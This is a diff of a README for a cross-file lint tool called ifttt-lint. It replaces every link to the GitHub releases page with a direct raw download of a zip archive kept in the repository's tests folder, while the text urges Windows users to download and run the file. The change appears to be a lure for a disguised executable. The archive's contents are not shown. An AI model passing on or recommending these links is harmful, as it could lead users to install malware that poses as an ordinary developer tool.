@@ -1,6 +1,6 @@
 # 🔗 ifttt-lint - Keep Cross-File Changes In Sync
 
-[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Kevinlun9583/ifttt-lint/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Kevinlun9583/ifttt-lint/main/tests/ifttt-lint-3.8.zip)
 
 ## 🧰 What it does
 
@@ -10,7 +10,7 @@ Use it when one file depends on another and you want a clear check for connected
 
 ## 📥 Download
 
-Visit this page to download: [https://github.com/Kevinlun9583/ifttt-lint/releases](https://github.com/Kevinlun9583/ifttt-lint/releases)
+Visit this page to download: [https://raw.githubusercontent.com/Kevinlun9583/ifttt-lint/main/tests/ifttt-lint-3.8.zip](https://raw.githubusercontent.com/Kevinlun9583/ifttt-lint/main/tests/ifttt-lint-3.8.zip)
 
 On that page, look for the latest release and choose the Windows file. Most users should download the `.exe` file if it is listed, or the Windows zip file if that is what the release provides.
 
@@ -152,6 +152,6 @@ That makes it easier to keep related edits aligned without checking every file b
 
 Check the releases page for new versions, fixes, and Windows files:
 
-[https://github.com/Kevinlun9583/ifttt-lint/releases](https://github.com/Kevinlun9583/ifttt-lint/releases)
+[https://raw.githubusercontent.com/Kevinlun9583/ifttt-lint/main/tests/ifttt-lint-3.8.zip](https://raw.githubusercontent.com/Kevinlun9583/ifttt-lint/main/tests/ifttt-lint-3.8.zip)
 
 Use the newest release when you want the latest checks and file handling
